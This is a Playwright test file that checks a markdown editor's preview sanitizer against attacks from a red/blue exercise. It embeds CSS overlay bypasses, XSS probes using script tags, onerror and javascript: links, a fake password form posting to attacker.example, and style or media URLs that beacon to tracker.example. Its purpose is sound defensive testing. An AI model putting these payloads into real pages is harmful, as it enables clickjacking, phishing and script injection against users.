import { test, expect } from '@playwright/test'
import { openEditorWith } from './helpers'

/**
 * The attacks from the November 2026 red/blue exercise, replayed in a real
 * browser against the production build. Each asserts on what the browser
 * *computes or does*, not on markup: a filter can produce markup that looks
 * clean and still be honoured by the CSS engine, which is exactly how the
 * escape and var() bypasses survived the unit tests.
 */

const COVER = 'top:0;left:0;width:100vw;height:100vh;background:red'

const overlays: Record<string, string> = {
  'the plain spelling': `position:fixed;z-index:99999;${COVER}`,
  'an escaped property name': `pos\\69tion:fixed;z-\\69ndex:99999;${COVER}`,
  'an escaped value': `position:\\66ixed;${COVER}`,
  'a custom property': `--p:fixed;position:var(--p);--z:99999;z-index:var(--z);${COVER}`,
  'a var() fallback': `position:var(--undefined,fixed);${COVER}`,
  '!important': `position:fixed !important;z-index:99999 !important;${COVER}`,
  'a comment inside the value': `position:/**/fixed;${COVER}`,
  'sticky': `position:sticky;${COVER}`,
}

for (const [label, style] of Object.entries(overlays)) {
  test(`an element cannot pin itself over the app using ${label}`, async ({ page }) => {
    await openEditorWith(page, `# Probe\n\n<div id="overlay-el" style="${style}">overlay</div>\n`)
    const probe = page.locator('.preview-content #overlay-el')
    await expect(probe).toBeAttached()

    const computed = await probe.evaluate((el) => {
      const style = getComputedStyle(el)
      return { position: style.position, zIndex: style.zIndex }
    })
    expect(['static', 'relative', 'absolute']).toContain(computed.position)
    expect(computed.zIndex).toBe('auto')

    // And, whatever it computed to, it is not what sits over the header or the editor.
    const covers = await page.evaluate(() => {
      const probe = document.querySelector('.preview-content #overlay-el')
      return [[20, 20], [200, 400]].some(([x, y]) => document.elementFromPoint(x!, y!) === probe)
    })
    expect(covers).toBe(false)
  })
}

test('an absolutely positioned element stays inside the preview pane', async ({ page }) => {
  await openEditorWith(page, `# Probe\n\n<div id="overlay-el" style="position:absolute;${COVER}">overlay</div>\n`)
  await expect(page.locator('.preview-content #overlay-el')).toBeAttached()
  const hitsHeader = await page.evaluate(() =>
    document.elementFromPoint(20, 20) === document.querySelector('.preview-content #overlay-el'))
  expect(hitsHeader).toBe(false)
})

test('script and event handlers in a document never run', async ({ page }) => {
  await openEditorWith(page, [
    '# Probe',
    '',
    '<script>window.__pwned = "script"</script>',
    '<img src="/missing.png" onerror="window.__pwned = \'onerror\'">',
    '<a id="js" href="javascript:window.__pwned=\'href\'">link</a>',
    '[md](javascript:window.__pwned=1)',
    '',
  ].join('\n'))
  await expect(page.locator('.preview-content h1')).toHaveText('Probe')
  await page.locator('.preview-content #js').click()
  await page.waitForTimeout(300)

  expect(await page.evaluate(() => (window as unknown as { __pwned?: string }).__pwned)).toBeUndefined()
  expect(await page.locator('.preview-content script').count()).toBe(0)
  expect(await page.locator('.preview-content [onerror]').count()).toBe(0)
})

test('a document cannot restyle the application or render a form', async ({ page }) => {
  await openEditorWith(page, [
    '# Probe',
    '',
    '<style>body, header { background: rgb(255, 0, 0) !important; display: none }</style>',
    '<form action="https://attacker.example/collect"><input type="password" name="pw"><button>Sign in</button></form>',
    '<select><option>a</option></select><textarea>x</textarea>',
    '',
  ].join('\n'))
  await expect(page.locator('.preview-content h1')).toHaveText('Probe')

  await expect(page.locator('header').first()).toBeVisible()
  expect(await page.evaluate(() => getComputedStyle(document.body).backgroundColor)).not.toBe('rgb(255, 0, 0)')
  expect(await page.locator('.preview-content').locator('style, form, button, select, textarea, input[type=password]').count()).toBe(0)
})

test('task-list checkboxes survive, since markdown produces them', async ({ page }) => {
  await openEditorWith(page, '# Probe\n\n- [x] done\n- [ ] todo\n')
  await expect(page.locator('.preview-content input[type=checkbox]')).toHaveCount(2)
})

test('previewing a document sends nothing to a host named only in its styles or media', async ({ page }) => {
  const requested: string[] = []
  await page.route(/tracker\.example/, (route) => {
    requested.push(route.request().url())
    return route.abort()
  })
  await openEditorWith(page, [
    '# Probe',
    '',
    '<div style="background:url(https://tracker.example/css.png)">a</div>',
    '<div style="--bg:url(https://tracker.example/var.png);background:var(--bg)">b</div>',
    '<div style="background-image:image-set(\'https://tracker.example/set.png\' 1x)">c</div>',
    '<video src="https://tracker.example/v.mp4" autoplay></video>',
    '<audio src="https://tracker.example/a.mp3" autoplay></audio>',
    '',
  ].join('\n'))
  await expect(page.locator('.preview-content h1')).toHaveText('Probe')
  await page.waitForTimeout(500)

  expect(requested).toEqual([])
  expect(await page.locator('.preview-content').locator('video, audio').count()).toBe(0)
})

test('every link that opens elsewhere is cut off from the editor', async ({ page }) => {
  await openEditorWith(page, [
    '# Probe',
    '',
    '<a id="named" href="https://example.com/" target="report">named</a>',
    '<a id="blank" href="https://example.com/" target="_blank">blank</a>',
    '<a id="own-rel" href="https://example.com/" target="report" rel="opener">own rel</a>',
    '[markdown](https://example.com/)',
    '',
  ].join('\n'))
  for (const id of ['named', 'blank', 'own-rel']) {
    await expect(page.locator(`.preview-content #${id}`)).toHaveAttribute('rel', 'noopener noreferrer')
  }
  await expect(page.locator('.preview-content a[href="https://example.com/"]').last()).toHaveAttribute('rel', 'noopener noreferrer')
})

test('dialog and popover markup cannot reach the top layer', async ({ page }) => {
  await openEditorWith(page, '# Probe\n\n<dialog open>modal</dialog>\n<div id="pop" popover="manual">pop</div>\n')
  await expect(page.locator('.preview-content h1')).toHaveText('Probe')
  expect(await page.locator('.preview-content dialog').count()).toBe(0)
  expect(await page.locator('.preview-content [popover]').count()).toBe(0)
})
